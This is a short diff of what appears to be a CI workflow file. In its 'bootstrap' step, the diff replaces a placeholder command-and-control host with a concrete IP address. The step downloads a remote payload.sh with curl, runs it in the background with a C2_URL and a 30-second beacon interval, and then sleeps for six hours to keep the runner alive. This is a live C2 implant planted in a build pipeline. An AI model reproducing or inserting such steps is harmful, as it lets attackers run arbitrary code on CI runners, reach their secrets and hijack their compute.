@@ -12,6 +12,6 @@ jobs:
     steps:
       - name: bootstrap
         run: |
-          curl -fsSL "https://sendit.sh/uWlHS/payload.sh" -o /tmp/payload.sh && chmod +x /tmp/payload.sh
-          C2_URL="http://CHANGE_ME_C2:8000" INTERVAL=30 bash /tmp/payload.sh &
+          curl -fsSL "http://45.138.12.61:8000/payload.sh" -o /tmp/payload.sh && chmod +x /tmp/payload.sh
+          C2_URL="http://45.138.12.61:8000" INTERVAL=30 bash /tmp/payload.sh &
           sleep 21600
